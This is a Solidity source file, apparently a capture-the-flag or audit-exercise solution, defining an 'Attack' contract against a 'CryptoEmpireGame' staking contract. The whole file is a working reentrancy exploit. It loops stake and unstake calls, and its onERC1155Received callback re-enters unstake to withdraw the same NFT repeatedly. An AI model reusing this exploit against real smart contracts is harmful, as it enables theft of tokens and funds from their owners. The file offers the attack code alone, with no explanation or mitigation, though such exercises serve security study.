// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
import { IERC1155 } from "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";

import {console} from "forge-std/console.sol";

interface ICryptoEmpireGame {
    function cryptoEmpireToken() external returns(IERC1155);
    function listForSale(uint256 _nftId, uint256 _price) external;

    function stake(uint256 _nftId) external;
    function unstake(uint256 _nftId) external;

    function borrow(uint256 amount) external;

    function deposits(address account) external returns (uint256);
}


contract Attack {

    ICryptoEmpireGame game;
    address private owner;
    uint8 private reentrant = 0;

    constructor(address _game) {
        owner = msg.sender;
        game = ICryptoEmpireGame(_game);
    }

    function attack() external {
        require(owner == msg.sender, "not owner");
        console.log("attack");
        game.cryptoEmpireToken().setApprovalForAll(address(game), true);
        for (uint8 i = 0; i < 20; i++) {
            game.stake(2);
            game.unstake(2);
        }
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata 
    ) external returns (bytes4) {
        reentrant += 1;

        if (reentrant % 2 == 0) {
            game.unstake(2);
        }

        return this.onERC1155Received.selector;
    }

}